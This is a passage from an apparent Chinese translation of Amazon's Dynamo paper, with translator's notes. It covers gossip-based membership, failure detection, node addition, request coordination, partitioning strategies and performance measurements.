删除。负责处理这个请求的 node 将成员变动信息和对应的时间写入持久存储。成员变动会形成历史记录，因为一个节 点可能会多次从系统中添加和删除。Dynamo <strong>使用一个 gossip-based 的算法通告（ propagete）成员变动信息</strong>，维护成员的一份最终一致视图。</p><p>每个节点每秒会随机选择另一个节点作为对端，这两个节点会高效地 reconcile 它们的成 员变动历史。</p><p><strong>一个节点第一次起来时，首先会选择它的 token 集合</strong>（一致性哈希空间内的虚拟节点 ），然后<strong>将节点映射到各自的 token 集合</strong>。</p><blockquote><p>When a node starts for the first time, it chooses its set of tokens (virtual nodes in the consistent hash space) and maps nodes to their respective token sets.</p></blockquote><p><strong>映射关系会持久存储到磁盘上</strong>，初始时只包含本节点（local node）和 token set。存 储在不同 Dynamo 节点上的<strong>映射关系，会在节点交换成员变动历史时被 reconcile</strong>。因 此，partitioning 和 placement（数据的放置信息）也会通过 gossip 协议进行扩散，<strong>最 终每个节点都能知道其他节点负责的 token 范围</strong>。</p><blockquote><p>The mappings stored at different Dynamo nodes are reconciled during the same communication exchange that reconciles the membership change histories.</p><p>Therefore, partitioning and placement information also propagates via the gossip-based protocol and each storage node is aware of the token ranges handled by its peers.</p></blockquote><p>这<strong>使得每个节点可以将一个 key 的读&#x2F;写操作直接发送给正确的节点</strong>进行处理。</p><h4 id="4-8-2-系统外部发现（External-Discovery）和种子节点"><a href="#4-8-2-系统外部发现（External-Discovery）和种子节点" class="headerlink" title="4.8.2 系统外部发现（External Discovery）和种子节点"></a>4.8.2 系统外部发现（External Discovery）和种子节点</h4><p>以上机制<strong>可能导致 Dynamo ring 在逻辑上临时分裂</strong>。</p><p>例如，管理员先联系 node A，将 A 将入 ring，然后又联系 node B 加入 ring。在这种情 况下，A 和 B 都会认为它们自己是 ring 的成员，但不会立即感知到对方。</p><p><strong>为了避免逻辑分裂，我们会将一些 Dynamo 节点作为种子节点</strong>。种子节点是通过外部机 制（external mechanism）发现的，所有节点都知道种子节点的存在。因为所有节点最终都 会和种子节点 reconcile 成员信息，所以逻辑分裂就几乎不可能发生了。</p><p>种子或者从静态配置文件中获取，或者从一个配置中心获取。通常情况下，种子节点具有普 通节点的全部功能。</p><h4 id="4-8-3-故障检测"><a href="#4-8-3-故障检测" class="headerlink" title="4.8.3 故障检测"></a>4.8.3 故障检测</h4><p>故障检测在 Dynamo 中用于如下场景下跳过不可达的节点：</p><ul><li><code>get()</code> 和 <code>put()</code> 操作时</li><li>转移 partition 和 hinted replica 时</li></ul><p>要避免尝试与不可达节点通信，一个<strong>纯本地概念（pure local notion）的故障检测</strong>就 足够了：节点 B 只要没有应答节点 A 的消息，A 就可以认为 B 不可达（即使 B 可以应答 C 的消息）。</p><p>在客户端有持续频率的请求的情况下，Dynamo ring 的节点之间就会有持续的交互；因此只 要 B 无法应答消息，A 可以很快就可以发现；在这种情况下，A 可以选择和与 B 同属一个 partition 的其他节点来处理请求，并定期地检查 B 是否活过来了。</p><p><strong>在没有持续的客户端请求的情况下，两个节点都不需要知道另一方是否可达。</strong></p><blockquote><p>In the absence of client requests to drive traffic between two nodes, neither node really needs to know whether the other is reachable and responsive.</p></blockquote><p><strong>去中心化故障检测协议使用简单的 gossip 风格协议，使得系统内的每个节点都可以感知 到其他节点的加入或离开</strong>。想详细了解去中心化故障检测机制及其配置，可以参考 [8]。</p><p>Dynamo 的早期设计中使用了一个去中心化的故障检测器来维护故障状态的全局一致视图 （globally consistent view of failure state）。</p><p>后来我们发现，我们<strong>显式的节点加入和离开机制</strong>使得这种全局一致视图变得多余了。因 为节点的真正（permanent）加入和离开消息，依靠的是我们的显式添加和删除节点机制， 而临时的加入和离开，由于节点之间的互相通信（转发请求时），它们自己就会发现。</p><h3 id="4-9-添加-移除存储节点"><a href="#4-9-添加-移除存储节点" class="headerlink" title="4.9 添加&#x2F;移除存储节点"></a>4.9 添加&#x2F;移除存储节点</h3><p>当一个新节点 <code>X</code> 加入到系统后，它会<strong>获得一些随机分散在 ring 上的 token</strong>。对每 个分配给 <code>X</code> 的 key range，当前可能已经有一些（小于等于 <code>N</code> 个）节点在负责处理了 。因此,将 key range 分配给 <code>X</code> 后，这些节点就不需要处理这些 key 对应的请求了，而 要将 keys 转给 <code>X</code>。</p><p>考虑一个简单的情况：<code>X</code> 加入 图 2 中 <code>A</code> 和 <code>B</code> 之间。这样，<code>X</code> 就负责处理落到 <code>(F, G], (G, A] and (A, X]</code> 之间的 key。结果，<code>B</code>、<code>C</code> 和 <code>D</code> 节点就不需负责相应 range 了。因此，在收到 <code>X</code> 的转移 key 请求之后，<strong>B、C 和 D 会向 X 转移相 应的 key</strong>。当移除一个节点时，key 重新分配的顺序和刚才相反。</p><p><img src="/assets/images/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）" loading="lazy"></p><p>我们的实际运行经验显示，这种方式<strong>可以在存储节点之间保持 key 的均匀分布</strong>，这对 于保证延迟需求和快速 bootstrapping 是非常重要的。另外，在源和目的节点之间加了确 认（转移），可以保证不会转移重复的 key range。</p><h2 id="5-实现"><a href="#5-实现" class="headerlink" title="5. 实现"></a>5. 实现</h2><p>Dynamo 中的<strong>每个存储节点上主要有三个组件</strong>，都是用 Java 实现的：</p><ul><li>request coordination（请求协调）组件</li><li>成员验证和故障检测组件</li><li>本地持久存储引擎</li></ul><h3 id="本地存储引擎"><a href="#本地存储引擎" class="headerlink" title="本地存储引擎"></a>本地存储引擎</h3><p>Dynamo 的本地持久存储组件支持以插件的方式使用不同的存储引擎。在使用的引擎包括：</p><ul><li>Berkeley Database (BDB) Transactional Data Store2</li><li>BDB Java Edition</li><li>MySQL</li><li>an in-memory buffer with persistent backing store</li></ul><p>将其设计为可插拔的原因是：<strong>为不同应用访问类型选择最合适的存储引擎</strong>。例如，BDB 通常用于处理几十 KB 大小的对象，而 MySQL 可以处理更大的对象。应用可以根据它们的 对象大小分布选择合适的持久化引擎。</p><p>我们生产环境的 Dynamo 大部分使用的都是 BDB Transactional Data Store。</p><h3 id="请求协调"><a href="#请求协调" class="headerlink" title="请求协调"></a>请求协调</h3><p>request coordination 组件构建在一个事件驱动的消息系统之上，其中的消息处理 pipeline 分为多个阶段，和 SEDA 架构类似 [24]。所有通信都基于 Java NIO channel 实现。</p><p><strong>coordinator 代替客户端执行读和写请求</strong>：读操作时会从一个或多个节点收集数据，写操作 时会向一个或多个节点存储数据。每个客户端请求都会<strong>在收到这个请求的节点上创建一个状 态机</strong>。这个状态机包含了识别 key 对应的节点、发送请求、等待响应、重试、处理响应和 组合响应返回给客户端等所有逻辑。</p><h4 id="read-coordination"><a href="#read-coordination" class="headerlink" title="read coordination"></a>read coordination</h4><p>每个状态机处理且只处理一个客户端请求。例如，一个读操作实现了包含如下步骤的状态机：</p><ol><li>发送读请求给节点</li><li>等待所需的最少数量响应</li><li>如果在规定的上限时间内收到的响应数量太少，认定请求失败</li><li>否则，收集对象的所有版本，确定应该返回哪些</li><li>如果打开了版本化（versioning）配置，执行 syntactic reconciliation，生成一个不 透明的写上下文（context），其中包含了合并之后的版本对应的的 vector clock</li></ol><p>为了描述的简单，以上没有提及故障处理和重试的步骤。</p><p><strong>读操作的响应发送给调用方之后，状态机会继续等待一小段时间，接收可能的有效响应</strong>（ outstanding responses，例如最小数量响应之外的其他节点的响应，译者注）。</p><p>如果返回中有过期版本（stale version），coordinator 就需要合并版本，并将最新版本 更新回这些节点。这个过程称为**“读时修复”（read repair）<strong>，因为它</strong>在一个乐观的 时间点**（at an opportunistic time）<strong>修复了那些错过了最新更新的副本</strong>（replicas that have missed a recent update），<strong>减少了逆熵协议的工作</strong>（本来应该是稍后由逆 熵协议做的）。</p><h4 id="write-coordination"><a href="#write-coordination" class="headerlink" title="write coordination"></a>write coordination</h4><p>前面提到过，写请求是由 preference list 内的前 N 个节点中的任意一个 coordinate 的 。总是让 N 个节点中的第一个来 coordinate 有一些好处，例如可以使得在同一个地方完 成写操作的顺序化（serializing all writes），但是，这种方式也有缺点：它会导致不均 匀的负载分布，损害 SLA。这是因为对象请求并不是均匀分布的（request load is not uniformly distributed across objects）。</p><p>为了解决这个问题，<strong>preference list 内的所有 N 个节点都可以 coordinate 写操作</strong>。 而且，因为一个写操作之前通常有一个读操作，因此写操作的 coordinator 都选择为：<strong>前 一次读操作返回最快的那个节点</strong>，这个信息存储在读操作返回的上下文中。</p><p>这项优化还使在下一次读取时，前一次读操作选中的存储这个数据的节点更容易被选中，提 高了“读取刚写入的数据”（“read-your-writes”）的概率。</p><blockquote><p>This optimization enables us to pick the node that has the data that was read by the preceding read operation thereby increasing the chances of getting “read-your-writes” consistency.</p></blockquote><p>同时，还降低了请求处理性能的抖动性，提高了 <code>P99.9</code> 性能。</p><h2 id="6-测试结果及学到的经验"><a href="#6-测试结果及学到的经验" class="headerlink" title="6. 测试结果及学到的经验"></a>6. 测试结果及学到的经验</h2><p>Dynamo 被几种不同类型的服务使用，每种场景下的配置不同。这些不同体现在 vesion reconciliation 逻辑和读&#x2F;写仲裁特点上。几种主要的场景：</p><ul><li><strong>业务逻辑相关的 reconciliation</strong>：这种场景使用很广。每个数据对象都会复制到不同节 点上，发生<strong>版本冲突时由应用执行自己的 reconciliation 逻辑</strong>。前文提到的购物 车服务就是一个典型的例子，应用自己来合并冲突的购物车版本</li><li><strong>基于时间戳的 reconciliation</strong>：和第一种的不同仅仅是 reconciliation 机制。当 发生版本冲突时，Dynamo 根据**“最后一次写胜出”**（last write wins）机制，例如， 选择时间戳最近的一个版本作为最终版本。一个例子是维护客户 session 信息的服务</li><li><strong>高性能读引擎</strong>：虽然 Dynamo 设计为永远可写（always writeable） 数据仓库, 但 一些服务通过<strong>对 Dynamo 的仲裁特性进行调优（tuning），而将其作为一个高性能读引 擎使用</strong>。典型情况下，这类服务有很高的读频率和很小的写频率。<strong>在这种配置中， R 一般设为 1，W 设为 N</strong>。对于这些服务，Dynamo 提供了 partition 和数据跨 多节点复制的能力，因而提供了增量可扩展性。<strong>数据的权威持久缓存</strong>（the authoritative persistence cache for data）存储在更重量级的后端存储中（more heavy weight backing stores）。<strong>维护产品目录和促销商品的服务</strong>会用到这种类型 的 Dynamo 配置</li></ul><p>Dynamo 的最大优势是：<strong>客户端应用可以通过对 N、R 和 W 三个参数进行调优来达到期 望的性能、可用性和持久性等级</strong>。</p><blockquote><p>The main advantage of Dynamo is that its client applications can tune the values of N, R and W to achieve their desired levels of performance, availability and durability.</p></blockquote><p>例如，N 的大小决定了每个对象的持久性。Dynamo 用户最常用的 N 配置是 3。</p><p>W 和 R 的值会影响对象的可用性、持久性和一致性。例如，如果 W 设为 1，那只要系统还 有一台正常的 node，写操作就不会被拒绝。但是，太小的 W 和 R 配置会增加不一致的风 险，因为一次写操作即使在没有大多数副本都写成功的情况下，还是会给客户端返回成功。 这也导致存在一个<strong>风险窗口</strong>（vulnerability window）：<strong>一次写操作即使只在少量节 点上完成了持久化，也会向客户端返回成功</strong>。</p><p>传统观点认为，持久性和可用性是相伴而生（go hand in hand）的，但在这里不一定成立。 例如，增加 W 就会减小持久性的风险窗口；但是，这可能会增加请求被拒绝的概率（因此 降低了可用性），因为这种情况下需要更多的健康存储节点来处理写请求。</p><p>我们<strong>最常用的 Dynamo 集群 (N,R,W) 配置是 (3,2,2)</strong>。这个配置符合我们所需的 性能、持久性、一致性和可用性（SLA）等级。</p><p>本节所有的数据都是从一套线上 Dynamo 环境获得的，配置是 <code>(3,2,2)</code>， 有几百台节点（a couple hundred nodes），配置利用到了异构硬件信息。</p><p>之前我们提到，每套 Dynamo 的节点都是跨数据中心部署的，这些数据中心之间通过高速网 络互联。执行一次成功的 <code>get</code> （或 <code>put</code>）需要 <code>R</code> （或 <code>W</code>）个节点向 coordinator 发送响应，因此很明显，数据中心之间的时延会影响到响应时间，因此在选择节点（以及它 所在的数据中心的位置）的时候要特别注意，以保证能满足应用期望的 SLA。</p><h3 id="6-1-性能和持久性的平衡"><a href="#6-1-性能和持久性的平衡" class="headerlink" title="6.1 性能和持久性的平衡"></a>6.1 性能和持久性的平衡</h3><p>虽然 Dynamo 的首要设计目标是一个高可用数据仓库，但性能指标在 Amazon 也同样重要。 前面提到过，为了提供一致的用户体验，Amazon 的服务会设置一个很高的用百分比衡量的 （例如 <code>P99.9</code> 或 <code>P99.99</code>）性能指标。典型的 SLA 指标是：读和写操作的 <code>P99.9</code> 要 在 <code>300ms</code> 以内成。</p><p>由于 Dynamo 是在<strong>通用硬件</strong>上运行的，和高端企业级服务器相比，<strong>I&#x2F;O 吞吐性能要差 很多</strong>，因此提供一致的高性能读写并不是一项简单的工作。而且，每次读&#x2F;写操作都要涉 及多台节点，给这项工作带来了更大的挑战性，因为<strong>最终的性能受限于最慢的那个副本所 在的节点</strong>。</p><h4 id="通用配置下的性能"><a href="#通用配置下的性能" class="headerlink" title="通用配置下的性能"></a>通用配置下的性能</h4><p>图 4 显示了 30 天内 Dynamo 的读和写操作延迟平均值和 <code>P99.9</code>：</p><p><img src="/assets/images/dynamo-figure-4.png" alt="图 4 2006 年 12 月峰值请求季的读写延迟平均值和 P99.9。 X 轴一个刻度 12 小时。延迟走势和每天的请求量走势一致，延迟的 P99.9 比平均值要大一个数量级" loading="lazy"></p><p>从图上可以看出，延迟曲线每天的走势（diurnal pattern）都类似，这和平台每天的请求 量走势也是一致的（例如，白天和晚上的请求量明显不一样）。另外，写延迟明显高于读延 迟，因为<strong>写操作永远需要访问磁盘</strong>。另外，<strong>P99.9 大约为 200ms，比平均值高一 个数量级</strong>。这是因为 P99.9 有很多影响因素，例如请求负载变化、对象大小和 locality patterns。</p><h4 id="低延迟配置下的性能"><a href="#低延迟配置下的性能" class="headerlink" title="低延迟配置下的性能"></a>低延迟配置下的性能</h4><p>以上性能对很多服务来说都足够了，但有少数面向用户的服务，它们对性能有更高的要求。 对于这种情况，Dynamo 提供了<strong>牺牲持久性换性能</strong>的能力。具体来说，每个存储节点会 <strong>在主内存中维护一个对象缓存</strong>（object buffer），写操作将数据存储到缓存直接返回， 另有一个独立的写线程定期将数据写入磁盘。读操作会先检查缓存中是否有，如果有，就直 接从缓存读，从而避免了访问存储引擎。</p><p>这项优化可以<strong>将峰值流量期间的 P99.9 降低到原来的 1&#x2F;5</strong>，即使只使用一个很小的 、只能存放 1000 个对象的缓存，见图 5。</p><p><img src="/assets/images/dynamo-figure-5.png" alt="图 5 带缓存和不带缓存的 P99.9 性能对比，时间跨度 24 小时，X 轴一个刻度一个小时" loading="lazy"></p><p>另外，从图中可以看到，缓存写（write buffering）可以对百分比延迟进行平滑。显然， 这种方案中持久性和性能之间做了折中：一台<strong>节点挂掉会导致缓存里还未落盘的数据丢失</strong>。 为了减小这种风险，写操作进行了优化（refine），由 coordinator <strong>从 N 个副本中选择 一个进行持久化写入</strong>（durable write）。因为 coordinator 只等待 <code>W</code> 个写操作，因此整 体的写操作不受这次写盘操作的影响。</p><blockquote><p>以上优化的意思是，每次写操作到达 coordinator 时，它会将请求转发给相应个节点， 这些节点都是写完内存 buffer 就直接返回的；除此之外，coordinator 还会挑一个节点 进行持久写入，跟其他节点的写是并行进行的，这样可以降低其他节点挂掉时内存数据丢 失的风险。由于 coordinator 只等待 W 个结果就返回了，因此虽然这个执行持久写的节 点（相对）很慢，但 coordinator 并不会依赖它的结果才返回，因此文中说对写性能来 说是没有影响的，译者注。</p></blockquote><h3 id="6-2-均匀负载分布（Uniform-Load-distribution）"><a href="#6-2-均匀负载分布（Uniform-Load-distribution）" class="headerlink" title="6.2 均匀负载分布（Uniform Load distribution）"></a>6.2 均匀负载分布（Uniform Load distribution）</h3><p>Dynamo 通过一致性哈希将它的 key 空间进行 partition，保证负载分布的均匀性。 只要 key 的访问不是极度不均衡，均匀的 key 分布就可以帮助我们实现负载的均衡分布。 特别地，即使出现了明显的 key 访问不平衡的情况，只要这些 key 足够多，Dynamo 也能 保证这些 key 在后端节点之间是均衡分散的。 本节介绍 Dynamo 中的负载不平衡问题，几种解决策略及其对负载分布的影响。</p><p>为了研究负载不平衡（load imbalance）以及它和请求负载（request load）的相关性，我 们测量了 24 个小时内每台节点收到的请求量，以 30 分钟作为一个点。在规定的时间内， 只要节点收到的请求量偏离平均值的程度不超过一个阈值（例如，15%），这台节点就认为 是平衡的（inbalance）；否则，就是不平衡的（out of balance）。</p><p>图 6 展示了不平衡的节点所占的比例（imbalance ratio）：</p><p><img src="/assets/images/dynamo-figure-6.png" alt="图 6 不平衡节点比例，及其负载（请求数），X 轴一个刻度 30 分钟" loading="lazy"></p><p>作为参考，图中也画出了这段期间系统的总负载（请求量）。从图中可以看出，随着请求量 的上升，不平衡的比例在下降。例如，低负载期间的不平衡比例高达 20%，而高负载期间降 到了 10%。直观上可以解释：随着负载（请求量）的上升，大量的活跃 key 的访问会均匀 的分发到节点，导致负载平衡分布。而低峰期间（请求量只有峰值的 1&#x2F;8），只有很少的 活跃 key 访问，导致负载非常不平衡。</p><p>本节接下来介绍 Dynamo 的 partition scheme 是如何随时间演进的，以及它对负载分布的 影响。</p><h4 id="策略-1：每个节点-T-个随机-token，按-token-值分散"><a href="#策略-1：每个节点-T-个随机-token，按-token-值分散" class="headerlink" title="策略 1：每个节点 T 个随机 token，按 token 值分散"></a>策略 1：每个节点 T 个随机 token，按 token 值分散</h4><p>这是生产环境最早部署的策略（在 4.2 节介绍过了）。</p><p>在这种策略中，会<strong>给每个节点（从哈希空间）随机分配 T 个 token</strong>。所有节点的 token 在哈希空间中是有序的（按 token 值）。<strong>两个相邻的 token 定义一个范围</strong>（ key range）。最后一个 token 和第一个 token 收尾相连。</p><p>因为 token 是随机选择的，因此范围有大有小。<strong>当有节点加入或离开系统的时，token 集合会变化，导致范围也会跟着变</strong>。注意，<strong>每个节点用来维护成员信息所需的空间随着 系统中的节点数线性增长</strong>。</p><p>这种策略在使用过程中发现如下几个问题。</p><p>首先，一个<strong>新节点加入到系统后，需要从其他节点“偷”出它要用的 key range</strong>。 这会导致那些需要将一部分 key range 移交给新节点的节点，<strong>扫描它们全部的本地持久存 储</strong>，以过滤出所需的数据。在生产环境环境执行这种扫描操作是很棘手的，因为它 会<strong>占用大量磁盘 IO</strong>；为了不影响正常的请求处理，需要把这个任务放到后台。 这要求我们只能将新节点加入集群的任务调到最低优先级。这带来的后果就是，<strong>节点上线的 速度非常慢</strong>，尤其是购物高峰季每天处理百万请求时，上线一台节点需要花费几乎一整天时 间。</p><p>第二，一个节点加入或离开系统时，很多节点负责的 key range 会发生变化，对应的 <strong>Merkle tree 需要重新计算</strong>。对于生产环境来说，这也是一项不小的工作。</p><p>最后，由于 key range 的随机性，<strong>无法快速地对整个 key 空间进行快照</strong>（snapshot）。 这使得存档（备份）工作变得复杂。在这种方案下，我们进行一次快照需要分别从所有节 点获取 key，非常低效。</p><p><strong>这种策略的根本问题出在：数据的 partition 和 placement 方案混在了一起</strong>（ intertwined）。例如，在某些场景下希望通过增加节点应对请求量的上涨，但是在这种方 案中，<strong>无法做到添加新节点不影响数据 partition</strong>。</p><p>理想情况下，应该使用独立的数据 partition 和 placement 方案。为此，我们考察了下面的几种方案。</p><h4 id="Strategy-2-每个节点-T-个随机-token，平均分散"><a href="#Strategy-2-每个节点-T-个随机-token，平均分散" class="headerlink" title="Strategy 2: 每个节点 T 个随机 token，平均分散"></a>Strategy 2: 每个节点 T 个随机 token，平均分散</h4><p>这种策略将哈希空间分为 <code>Q</code> 个相同大小的 partition&#x2F;range，每个节点分配 <code>T</code> 个 随 机 token。<code>Q</code> 的选择通常要满足：<code>Q &gt;&gt; N</code> 和 <code>Q &gt;&gt; S*T</code>（<code>&gt;&gt;</code>：远大于，译者注）， 其中 <code>S</code> 是系统中节点的数量。</p><p>在这种策略中，token 仅用于<strong>哈希空间的值映射到有序节点列表</strong>的过程，并<strong>不影响数 据 partition</strong>。</p><p>一个 partition 会放在从该 partition 末尾开始<strong>沿顺时针方向得到的前 N 个独立节点</strong>。</p><p><img src="/assets/images/dynamo-figure-7.png" alt="图 7 三种策略中 key 的 partition 和 placement。N&#x3D;3，A、B、 C 是 key k1 的 preference list 中的三个独立节点。阴影区域表示 preference list 是 [A,B,C] 的 key range，箭头表示不同节点对应的 token 位置" loading="lazy"></p><p>图 7 展示了 <code>N=3</code> 时这种策略的示意图。</p><p>这种策略的主要优点：</p><ol><li>将数据的 partition 和 placement 解耦</li><li>提供了在运行时更改 placement 方案的能力</li></ol><h4 id="Strategy-3-每个节点-Q-S-个-token-平均分散"><a href="#Strategy-3-每个节点-Q-S-个-token-平均分散" class="headerlink" title="Strategy 3: 每个节点 Q/S 个 token, 平均分散"></a>Strategy 3: 每个节点 <code>Q/S</code> 个 token, 平均分散</h4><p>和策略 2 类似，策略 3 也将哈希空间等分为 <code>Q</code> 个 partition，而且 placement 从 partition 解耦。不同的是，每个节点会分配 <code>Q/S</code> 个 token，其中 <code>S</code> 是系统中的节点 数量。</p><p>当一个节点离开时，它的 token 会随机地分配给其他节点，因此 <code>Q/S</code> 个 token 的特性 还是能成立。类似地，当一个节点加入系统时，它会从其他节点“偷”一些 token 过来，同 时保证 <code>Q/S</code> 特性仍然成立。</p><h4 id="几种策略的性能对比"><a href="#几种策略的性能对比" class="headerlink" title="几种策略的性能对比"></a>几种策略的性能对比</h4><p>对一套 <code>S=30</code>，<code>N=3</code> 的 Dynamo 测试了以上三种策略。需要说明的是，公平地比较这三 种策略的性能是很难做到的，因为它们有各自特殊的配置可以调优。例如，策略 1 的负载 分布特性取决于 token 的数量（例如 <code>T</code>），而策略 3 取决于 partition 的数量（例如 <code>Q</code>）。</p><p>一种比较公平的方式是：<strong>所有的策略都使用相同大小的空间存储成员信息时，测量它们的 负载分布倾斜度</strong>（skew in load distribution）。例如，策略 1 中每个节点需要为环上 的全部节点维护各自的 token 位置，而策略 3 中每个节点需要维护系统分配给每个节点的 partition 信息。</p><p>实验中我们将通过改变相关的参数（<code>T</code> 和 <code>Q</code>）来评估这三种策略。测试每个节点需要维 护的成员信息的大小（size）不同时，几种策略的<strong>负载均衡效率</strong>。其中负载均衡效率（ load balancing efficiency）的定义是：每个节点平均处理的请求数 <code>/</code> 负载最高的节点处 理的请求数。</p><p>结果如图 8 所示。</p><p><img src="/assets/images/dynamo-figure-8.png" alt="图 8 三种策略的负载均衡效率对比，30 个几点，N&#x3D;3，每个节点维护相同大小的元数据" loading="lazy"></p><p>如图所示，<strong>策略 3 取得了最好的负载均衡性能，策略 2 最差</strong>。在某段较短的时期内， 策略 2 充当了将线上的一些 Dynamo 从策略 1 迁移到策略 3 的过渡策略。</p><p>和 策略 1 相比，策略 3 性能更好，而且减少了每个节点所需维护的成员信息的大小。</p><p><strong>虽然存储这些成员信息并不会占用太多存储，但是，节点通过 gossip 协议定期地将成员 信息发送给其他节点</strong>（gossip the membership information periodically），因此<strong>保 持这些信息越紧凑越好。</strong></p><p>此外，策略 3 部署更加方便，原因包括：</p><ol><li><strong>bootstrap 和恢复更快</strong>：因为 <strong>partition 范围是固定的</strong>，因此可以将其存放 到<strong>单独的文件</strong>，这样下次 relocation 的时候可以直接将<strong>整个文件</strong>发送给其他节点 （避免了为了定位特点的数据而进行的<strong>随机访问</strong>）。简化了 bootstrap 和恢复的过程</li><li><strong>易于存档</strong>：定期对数据集（dataset）进行存档是 Amazon 存储服务的硬性要求之一 。在策略 3 中，存档过程会变得更容易，因为 partition 文件可以单独存档。作为对 比，在策略 1 中，token 是随机选取的，存档的时候需要从所有节点分别获取它们存储 的 key 信息，通常非常低效，速度也很慢。</li></ol><p>策略 3 的不足：<strong>变更节点成员时，需要 coordination</strong>，以保持平均分配所需的前提特 性（preserve the properties required of the assignment）。</p><h3 id="6-3-版本分叉：什么时候？有多少？"><a href="#6-3-版本分叉：什么时候？有多少？" class="headerlink" title="6.3 版本分叉：什么时候？有多少？"></a>6.3 版本分叉：什么时候？有多少？</h3><p>我们已经提到过，Dynamo 是通过牺牲一些一致性（consistency）来换可用性（ availability）的。要准确地理解不同类型的一致性失败带来的影响需要考虑很多因素：故障时 常（outage length）、失败类型（type of failures）、组件可靠性、负载等等。 详细地展示这些数据超出了本文范围。但是，本节可以提供一个很好的总结指标：一份真实 的生产环境里<strong>应用看到的分叉版本数量</strong>（number of divergent versions seen by the application）。</p><p>有两种情况会出现数据版本的分叉：</p><ol><li>遇到节点失败、数据中心故障或网络分裂等故障场景</li><li>同一数据对象的大量并发写操作，不同节点都在 coordinating 写操作</li></ol><p>从使用性（usability）和效率的角度，最好在任何时间都保证分叉的版本数尽量小。</p><p>如果冲突的版本无法仅通过向量时钟做句法调和（syntactically reconcile），那就需要 将它们交给业务逻辑，执行语义调和（semantic reconciliation）。</p><blockquote><p>If the versions cannot be syntactically reconciled based on vector clocks alone, they have to be passed to the business logic for semantic reconciliation.</p></blockquote><p><strong>Semantic reconciliation 会给服务引入额外的负担</strong>，因此应当越少越好。</p><p>我们采集了 24 小时内返回到购物车应用的版本数量。结果显示在这段时间内，<code>99.94%</code> 的请求看到的都是一个版本（无冲突）；<code>0.00057%</code> 的请求看到能 2 个，<code>0.00047%</code> 能看 到 3 个，<code>0.00009%</code> 的能看到 4 个。这说明版本分叉的概率还是相当小的。</p><p>实验还显示，导致分叉版本数量增多的并不是故障，而是并发写数量的增加。并发写数据上 升通常都是 busy robots（自动化客户端程序）导致的，极少是人（的应用）导致的。由于 涉及商业机密，在此不再就这一问题进行更深入的讨论。</p><h3 id="6-4-客户端驱动或服务端驱动的-Coordination"><a href="#6-4-客户端驱动或服务端驱动的-Coordination" class="headerlink" title="6.4 客户端驱动或服务端驱动的 Coordination"></a>6.4 客户端驱动或服务端驱动的 Coordination</h3><p>第 5 节提到，Dynamo 有一个 request coordination 组件，利用状态机处理收到的请求。</p><h4 id="服务端驱动"><a href="#服务端驱动" class="headerlink" title="服务端驱动"></a>服务端驱动</h4><p>客户请求会通过负载均衡器均匀地分发给哈希环上的所有节点。每个节点都可以作为读请求 的 coordinator，而写操作的 coordinator 必须由 key 的 preference list 里面的节点 才能充当。有这种限制是因为，preference list 中的这些节点<strong>被赋予了额外的职责：创 建一个新的版本戳（version stamp），在因果关系上包含被它的写操作更新的版本</strong>。注 意，如果 Dynamo 的版本化方案使用的是物理时间戳（physical timestamps），那任何节 点都可以 coordinate 写操作。</p><h4 id="客户端驱动"><a href="#客户端驱动" class="headerlink" title="客户端驱动"></a>客户端驱动</h4><p>另一中 coordinate request 的方式是：<strong>将状态机前移到客户端</strong>（move the state machine to the client nodes）。在这种方式中，客户端应用使用库（library）在本地执 行请求 coordination。每个客户端定期地随机选择一个 Dynamo 节点，下载它的系统成员 状态（Dynamo membership state）的当前视图（current view）。有了这个信息，客户端 就可以知道任何 key 对应的 preference list 由哪些节点组成。</p><p>读请求可以在客户端节点（client node）coordinate，因此如果请求是被负载均衡器随机 分给一个 Dynamo 节点，那这种方式可以避免额外的网络转发跳数。写操作或者转发给 key 对应的 preference list 里面的一个节点，或者，如果使用的是基于时间戳的版本化方式 ，可以在本地 coordinate。</p><p>客户端驱动的一个重要<strong>优势</strong>是：不再需要一个负载均衡器才能均匀地分发客户负载。 在存储节点上近乎均匀分布的 key，暗含了（implicitly guaranteed）负载的均匀分布。</p><p>显然，这种方式的效率取决于客户端侧的成员信息的新鲜程度（how fresh the membership information）。当前，每个客户端会每隔 <code>10s</code> 随机地轮询（poll）一个 Dynamo 节点， 获取成员更新（membership updates）。这里选用 pull 而不是 push 模型是考虑前者在大 量客户端的情况下可扩展性更好，而且相比于客户端侧，只需在服务端侧维护很少的状态信 息。</p><p>然而，在最差的情况下，客户端的 membership 信息会有 <code>10s</code> 的脏数据。 因此，如果客户端检测到它的成员表（membership table）过期了（例如，当一些成员不可 达的时候），它会立即更新它的成员信息。</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><p>表 2 显示了客户端驱动比服务端驱动的 coordination 的性能提升，测量时间为 24 个小时。</p><p><img src="/assets/images/dynamo-table-2.png" alt="表 2 客户端驱动和服务端驱动的 coordination 性能对比" loading="lazy"></p><p>从中可以看出，客户端驱动的方式比服务端方式 <code>P99.9</code> 减少了至少 <code>30ms</code>，平均值减少 了 <code>3ms~4ms</code>。</p><p>延迟降低是因为客户端驱动的方式没有了负载均衡器的开销，而且减少了可能的将请求转发 给一个随机节点的网络跳数。</p><p>另外从表中还可以看出，平均延迟远远小于 <code>P99.9</code>。这是因为 Dynamo 的存储引擎缓存（ storage engine caches）和写缓存（write buffer）命中率很高。</p><p>另外，由于负载均衡器和网络会给延迟引入额外的抖动性，因此 <code>P99.9</code> 的性能提升要比 均值更明显。</p><h3 id="6-5-平衡后台和前台任务"><a href="#6-5-平衡后台和前台任务" class="headerlink" title="6.5 平衡后台和前台任务"></a>6.5 平衡后台和前台任务</h3><p>每个节点除了执行正常的前台 <code>put</code>&#x2F;<code>get</code> 操作之外，还需要为副本同步和数据移交（ handoff）（由于 hinting 或添加&#x2F;删除节点）执行不同种类的后台任务。</p><p>在早期的生产系统中，这些后台任务触发了资源竞争问题，影响了常规的 <code>get</code>&#x2F;<code>put</code> 操 作性能。</p><p>因此，必须在保证常规的关键操作不受明显影响的情况下，才允许执行后台任务。为此，我 们将后台任务关联了一种<strong>许可控制机制</strong>（admission control mechanism）。每个后台 任务通过这个控制器<strong>申请资源（例如数据库）的运行时时间片</strong>（runtime slice），这 些资源是在所有后台任务之间共享的。对前台任务性能的监控会通过<strong>反馈机制</strong>改变后台 任务可以使用的时间片数量。</p><p>许可控制器（admission controller）在执行一个前台 <code>put</code>&#x2F;<code>get</code> 操作的时候，会持续 监控资源访问的状况。<strong>监控的指标</strong>包括磁盘操作延迟、锁竞争和事务超时导致的数据库 